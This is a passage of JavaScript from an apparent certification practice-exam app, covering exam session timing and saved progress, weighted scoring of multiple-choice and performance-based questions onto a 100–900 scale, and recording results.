  if(q.type==='match')return A.some(r=>r.some(v=>v));
  if(q.type==='order')return A.join()!==q.start.join();
  if(q.type==='place')return Object.values(A).some(v=>v);

/* ---------- exam session ---------- */
let S=null,timerId=null,dirty=false;
function touch(){dirty=true;paintCount()}
function startExam(n,fresh){
  if(fresh||!store.prog[n]){
    const ans={};EXAMS[n].pbq.forEach(id=>ans[id]=init(PB[id]));
    store.prog[n]={ans,flag:{},idx:0,left:DURATION,started:Date.now()};save();
  }
  const P=store.prog[n];P.time=P.time||{};P.unsure=P.unsure||{};EXAMS[n].pbq.forEach(id=>{if(!P.ans[id])P.ans[id]=init(PB[id])});
  S={n,P,items:itemsOf(n),view:'q',filter:'all'};answers=P.ans;picked=null;
  clearInterval(timerId);
  timerId=setInterval(()=>{P.left--;if(S&&S.view==='q'){const kk=keyOf(S.items[P.idx]);P.time[kk]=(P.time[kk]||0)+1}paintTimer();if(P.left%5===0||dirty){save();dirty=false}if(P.left<=0){finish(true)}},1000);
  renderExam();
}

/* ---------- scoring ---------- */
function score(n,ans,strict,pbq,mcq){
  const items=itemsOf(n,pbq,mcq);const dom={};const miss={};const per=[];
  items.forEach(it=>{const d=domOf(it),w=it.t==='p'?PBQ_WEIGHT:1;let f;
    if(it.t==='p'){f=gradeP(PB[it.id],ans[it.id]||init(PB[it.id]));if(strict)f=f>=.999?1:0}
    else{const q=MCQ[it.id],A=(ans[keyOf(it)]||[]).slice().sort();f=(A.length===q.a.length&&A.every((v,i)=>v===q.a.slice().sort()[i]))?1:0}
    dom[d]=dom[d]||{e:0,m:0,n:0,c:0};dom[d].e+=f*w;dom[d].m+=w;dom[d].n++;if(f>=.999)dom[d].c++;
    if(f<.999){const o=objOf(it);miss[o]=(miss[o]||0)+1}
    per.push(f)});
  let tot=0,wsum=0;Object.keys(dom).forEach(d=>{tot+=WEIGHTS[d]*dom[d].e/dom[d].m;wsum+=WEIGHTS[d]});
  const pct=wsum?tot/wsum:0;
  return{scaled:Math.round(100+800*pct),pct,dom,miss,per};
}
function finish(auto){
  clearInterval(timerId);const n=S.n,P=S.P;const r=score(n,P.ans);
  const rec={date:Date.now(),scaled:r.scaled,used:DURATION-Math.max(0,P.left),auto,ans:P.ans,flag:P.flag,time:P.time||{},v:VER,unsure:P.unsure||{},pbq:EXAMS[n].pbq.slice(),mcq:EXAMS[n].mcq.slice()};
  (store.hist[n]=store.hist[n]||[]).push(rec);delete store.prog[n];save();S=null;
  renderResults(n,store.hist[n].length-1);
}
